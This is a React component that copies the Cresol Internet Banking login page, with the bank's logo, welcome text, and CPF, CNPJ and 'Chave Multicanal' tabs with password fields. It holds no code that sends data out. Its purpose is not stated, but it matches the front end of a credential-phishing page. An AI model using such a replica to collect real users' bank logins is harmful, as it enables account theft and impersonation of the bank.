
import React, { useState } from "react";
import { Eye, EyeOff, HelpCircle } from "lucide-react";
import womanImage from "/lovable-uploads/e7069972-f11c-4c5a-a081-9869f1468332.png";
import cresolLogo from "/lovable-uploads/afc18ce7-1259-448e-9ab4-f02f2fbbaf19.png";

const TABS = [
  { label: "Pessoa Física", value: "fisica" },
  { label: "Pessoa Jurídica", value: "juridica" },
  { label: "Gerenciador Financeiro", value: "financeiro" },
];

const Index = () => {
  const [tab, setTab] = useState("fisica");
  const [cpf, setCpf] = useState("");
  const [cnpj, setCnpj] = useState("");
  const [chaveMulticanal, setChaveMulticanal] = useState("");
  const [senha, setSenha] = useState("");
  const [showSenha, setShowSenha] = useState(false);
  const [saveCpf, setSaveCpf] = useState(false);
  const [saveCnpj, setSaveCnpj] = useState(false);
  const [saveChaveMulticanal, setSaveChaveMulticanal] = useState(false);

  const renderFormContent = () => {
    switch (tab) {
      case "fisica":
        return (
          <>
            {/* CPF */}
            <div className="mb-4">
              <label className="block text-sm text-gray-700 font-medium mb-1">CPF</label>
              <input
                type="text"
                className="w-full h-11 px-3 border border-gray-300 rounded focus:outline-none focus:ring-2 focus:ring-[#145C36] focus:border-[#145C36] transition text-base bg-white"
                placeholder="CPF"
                value={cpf}
                onChange={(e) => setCpf(e.target.value)}
                autoComplete="username"
              />
            </div>
            {/* Senha */}
            <div className="mb-3 relative">
              <label className="block text-sm text-gray-700 font-medium mb-1">Senha de acesso</label>
              <input
                type={showSenha ? "text" : "password"}
                className="w-full h-11 px-3 pr-10 border border-gray-300 rounded focus:outline-none focus:ring-2 focus:ring-[#145C36] focus:border-[#145C36] transition text-base bg-gray-100"
                placeholder="Senha"
                value={senha}
                onChange={(e) => setSenha(e.target.value)}
                autoComplete="current-password"
              />
              <button
                type="button"
                className="absolute right-3 top-[38px] transform -translate-y-1/2 text-gray-400 hover:text-[#145C36]"
                tabIndex={-1}
                onClick={() => setShowSenha((v) => !v)}
                aria-label={showSenha ? "Ocultar senha" : "Mostrar senha"}
              >
                {showSenha ? <EyeOff size={20} /> : <Eye size={20} />}
              </button>
            </div>

            {/* Salvar CPF */}
            <div className="flex items-center mb-6">
              <input
                id="saveCpf"
                type="checkbox"
                checked={saveCpf}
                onChange={() => setSaveCpf((v) => !v)}
                className="w-4 h-4 accent-[#145C36] border-gray-300 rounded focus:ring-[#145C36]"
              />
              <label htmlFor="saveCpf" className="ml-2 text-sm text-gray-700">
                Salvar CPF
              </label>
            </div>
          </>
        );

      case "juridica":
        return (
          <>
            {/* CNPJ */}
            <div className="mb-4">
              <label className="block text-sm text-gray-700 font-medium mb-1">CNPJ</label>
              <input
                type="text"
                className="w-full h-11 px-3 border border-gray-300 rounded focus:outline-none focus:ring-2 focus:ring-[#145C36] focus:border-[#145C36] transition text-base bg-white"
                placeholder="CNPJ"
                value={cnpj}
                onChange={(e) => setCnpj(e.target.value)}
                autoComplete="username"
              />
            </div>
            {/* Senha */}
            <div className="mb-3 relative">
              <label className="block text-sm text-gray-700 font-medium mb-1">Senha de acesso</label>
              <input
                type={showSenha ? "text" : "password"}
                className="w-full h-11 px-3 pr-10 border border-gray-300 rounded focus:outline-none focus:ring-2 focus:ring-[#145C36] focus:border-[#145C36] transition text-base bg-gray-100"
                placeholder="Senha"
                value={senha}
                onChange={(e) => setSenha(e.target.value)}
                autoComplete="current-password"
              />
              <button
                type="button"
                className="absolute right-3 top-[38px] transform -translate-y-1/2 text-gray-400 hover:text-[#145C36]"
                tabIndex={-1}
                onClick={() => setShowSenha((v) => !v)}
                aria-label={showSenha ? "Ocultar senha" : "Mostrar senha"}
              >
                {showSenha ? <EyeOff size={20} /> : <Eye size={20} />}
              </button>
            </div>

            {/* Salvar CNPJ */}
            <div className="flex items-center mb-6">
              <input
                id="saveCnpj"
                type="checkbox"
                checked={saveCnpj}
                onChange={() => setSaveCnpj((v) => !v)}
                className="w-4 h-4 accent-[#145C36] border-gray-300 rounded focus:ring-[#145C36]"
              />
              <label htmlFor="saveCnpj" className="ml-2 text-sm text-gray-700">
                Salvar CNPJ
              </label>
            </div>
          </>
        );

      case "financeiro":
        return (
          <>
            {/* Chave Multicanal */}
            <div className="mb-4">
              <label className="block text-sm text-gray-700 font-medium mb-1">Chave Multicanal</label>
              <input
                type="text"
                className="w-full h-11 px-3 border border-orange-400 rounded focus:outline-none focus:ring-2 focus:ring-orange-400 focus:border-orange-400 transition text-base bg-white"
                placeholder="Chave Multicanal"
                value={chaveMulticanal}
                onChange={(e) => setChaveMulticanal(e.target.value)}
                autoComplete="username"
              />
            </div>
            {/* Senha */}
            <div className="mb-3 relative">
              <label className="block text-sm text-gray-700 font-medium mb-1">Senha de acesso</label>
              <input
                type={showSenha ? "text" : "password"}
                className="w-full h-11 px-3 pr-10 border border-gray-300 rounded focus:outline-none focus:ring-2 focus:ring-[#145C36] focus:border-[#145C36] transition text-base bg-gray-100"
                placeholder="Senha"
                value={senha}
                onChange={(e) => setSenha(e.target.value)}
                autoComplete="current-password"
              />
              <button
                type="button"
                className="absolute right-3 top-[38px] transform -translate-y-1/2 text-gray-400 hover:text-[#145C36]"
                tabIndex={-1}
                onClick={() => setShowSenha((v) => !v)}
                aria-label={showSenha ? "Ocultar senha" : "Mostrar senha"}
              >
                {showSenha ? <EyeOff size={20} /> : <Eye size={20} />}
              </button>
            </div>

            {/* Salvar Chave Multicanal */}
            <div className="flex items-center mb-6">
              <input
                id="saveChaveMulticanal"
                type="checkbox"
                checked={saveChaveMulticanal}
                onChange={() => setSaveChaveMulticanal((v) => !v)}
                className="w-4 h-4 accent-[#145C36] border-gray-300 rounded focus:ring-[#145C36]"
              />
              <label htmlFor="saveChaveMulticanal" className="ml-2 text-sm text-gray-700">
                Salvar Chave Multicanal
              </label>
            </div>
          </>
        );

      default:
        return null;
    }
  };

  return (
    <div className="min-h-screen flex bg-[#fff]">
      {/* Left: Formulário */}
      <div className="w-1/2 flex flex-col justify-center px-[7%] py-12 relative">
        <div className="max-w-md w-full mx-auto">
          <img
            src={cresolLogo}
            alt="Cresol"
            className="h-8 mb-8"
          />
          <h1 className="text-2xl font-semibold text-gray-600 mb-3">Seja bem-vindo</h1>
          <p className="text-[1.1rem] text-gray-600 mb-8">
            Acesse sua conta e realize suas transações de forma rápida e segura a qualquer hora.
          </p>
          {/* Tabs */}
          <div className="flex mb-2 space-x-8 border-b border-gray-200">
            {TABS.map((t, idx) => (
              <button
                key={t.value}
                className={`pb-2 text-base font-semibold transition-colors 
                  ${
                    tab === t.value
                      ? "text-[#145C36] border-b-4 border-orange-400"
                      : "text-gray-500 border-b-4 border-transparent hover:text-[#145C36]"
                  }`}
                onClick={() => setTab(t.value)}
              >
                {t.label}
              </button>
            ))}
          </div>
          {/* Login Form */}
          <form className="mt-6">
            {renderFormContent()}

            {/* Entrar */}
            <button
              type="submit"
              className="w-full h-11 rounded bg-orange-500 hover:bg-orange-600 transition font-bold text-white text-lg shadow"
              style={{
                background: "linear-gradient(90deg,#ffaa00,#ff7300 100%)"
              }}
            >
              Entrar
            </button>
          </form>

          {/* Primeiro acesso - só aparece na aba financeiro */}
          {tab === "financeiro" && (
            <div className="mt-10 border-t border-gray-100 pt-8">
              <h2 className="text-lg font-semibold mb-2 text-[#145C36]">Primeiro acesso</h2>
              <p className="text-sm text-gray-600">
                Primeiro acesso ao Internet Banking Cresol? <br />
                <a href="#" className="text-orange-500 underline hover:text-orange-600 transition">Clique aqui</a> para criar sua senha.
              </p>
            </div>
          )}

          {/* Primeiro acesso - abas física e jurídica */}
          {(tab === "fisica" || tab === "juridica") && (
            <div className="mt-10 border-t border-gray-100 pt-8">
              <h2 className="text-lg font-semibold mb-2 text-[#145C36]">Primeiro acesso</h2>
              <p className="text-sm text-gray-600">
                Primeiro acesso ao Internet Banking Cresol? <br />
                <a href="#" className="text-orange-500 underline hover:text-orange-600 transition">Clique aqui</a> para criar sua senha.
              </p>
            </div>
          )}
        </div>
        
        {/* Help Icon */}
        <div className="absolute bottom-8 left-8">
          <button className="w-12 h-12 bg-orange-500 rounded-full flex items-center justify-center text-white hover:bg-orange-600 transition-colors shadow-lg">
            <HelpCircle size={24} />
          </button>
        </div>
      </div>
      
      {/* Right: Imagem da mulher */}
      <div className="w-1/2 hidden lg:block bg-[#f5f6f7] relative overflow-hidden">
        <img
          src={womanImage}
          alt="Mulher segurando celular"
          className="w-full h-full object-cover"
        />
      </div>
    </div>
  );
};

export default Index;
